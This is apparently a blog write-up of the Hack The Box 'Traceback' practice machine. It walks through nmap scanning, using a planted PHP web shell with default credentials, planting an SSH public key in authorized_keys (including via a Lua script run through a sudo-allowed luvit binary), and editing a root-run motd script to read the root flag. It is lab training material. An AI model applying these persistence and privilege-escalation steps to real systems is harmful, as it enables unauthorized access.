---
layout: post
title:  "HTB Traceback Walkthrough"
author: nanobyte
date:   2020-08-31
description: Hack The Box writeup for Traceback, Retired Linux Easy Box
tags: HTB_Walkthrough ssh pspy
---

I began with some simple enumeration scans:

{% highlight bash linenos %}
# Nmap 7.80 scan initiated Sat Mar 14 16:47:34 2020 as: nmap -sV -sC -Pn -p- -oA traceback.htb.nmap 10.10.10.181
Nmap scan report for 10.10.10.181
Host is up (0.041s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar 14 16:48:11 2020 -- 1 IP address (1 host up) scanned in 37.02 seconds
{% endhighlight %}

Once I found what was open, I began performing banner grabbing. I found that `XH4H` was listed all over the page:

{% highlight bash linenos %}
ssh xh4h@traceback.htb
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################
{% endhighlight %}

This led to nothing. So, checking out http, there was a note in the soure code:

{% highlight bash linenos %}
<!--Some of the best web shells that you might need ;)-->
{% endhighlight %}

Performing some OSINT, XH4H has a GitHub and forked a project over with the best php web shells:

https://github.com/Xh4H/Web-Shells

Once I had that, I check to see if any were on the website. One was! http://traceback.htb/smevk.php. Once I logged in to the webshell with the default `admin:admin` credentials, I then found that user webadmin had ssh, and an `authorized_keys` file I could write to. I wrote my `id_rsa.pub` to the authorized keys, and logged in with ssh.

Once logged in, I found with `sudo -l`, I can run `/home/sysadmin/luvit` as sysadmin with no password. Doing some googling, luvit is a lua driven tool to learn Lua. Luvit can also run .lua files. So, I created a Lua file, to again write my id_rsa.pub to the `authorized_keys` file:

{% highlight bash linenos %}
local test = io.open("/home/sysadmin/.ssh/authorized_keys", "a")
test:write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDORSNFXHRLa8rC5DieG5EFcwzHa4daADnRHCN3mHIrqujoJSOeb7lNkSg0zPRd2oAJHbZx+t4YsG1fssh1bAl/FUE62D+r+0ZpD8137GipGEflnUobWhgtpez8bf8CWrvFqnVSg4KhQ5qgVLckzJRWxHbCME49BKUi8EEtZv3yEviNuKkOSQsn6IWfoPlW0bNG0gZutltE1cTGLCEsHSYKIEjyZRpSfGAywbwWagpAlJrMscOzCet19Zswc33yNZtLtUPqxfqmmVG08PV8W7jqOQeVKak= root@beast\n")
test:close()
{% endhighlight %}

And then ran that file:

{% highlight bash linenos %}
sudo -u sysadmin /home/sysadmin/luvit blah.lua
{% endhighlight %}

Once I ran that, I then logged in as sysadmin over SSH and owned user:

{% highlight bash linenos %}
ssh -i /root/.ssh/id_rsa sysadmin@traceback.htb
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 



Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Mar 16 03:50:24 2020 from 10.10.14.2
$ ls
luvit  user.txt
$ cat user.txt
xxxxxxxxxxxxxxxxxxxx33ffbf0cceb2c46020
{% endhighlight %}

Enumerating, looking at pspy, I found that there is a running process every 30 seconds:

{% highlight bash linenos %}
/bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/

{% endhighlight %}
Looking in /etc/update-motd.d/ I see I have write access to 00-header, which displays the welcome message! Towards the bottom, I added the following to /etc/update-motd.d/00-header:

{% highlight bash linenos %}
[ -r /etc/lsb-release ] && . /etc/lsb-release

cat /root/root.txt
echo "\nWelcome to Xh4H land \n"
{% endhighlight %}

I then quickly logged in, and got the root flag:

{% highlight bash linenos %}
ssh -i /root/.ssh/id_rsa sysadmin@traceback.htb
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################
xxxxxxxxxxxxxxxx4f6f56d822a357585d6
{% endhighlight %}
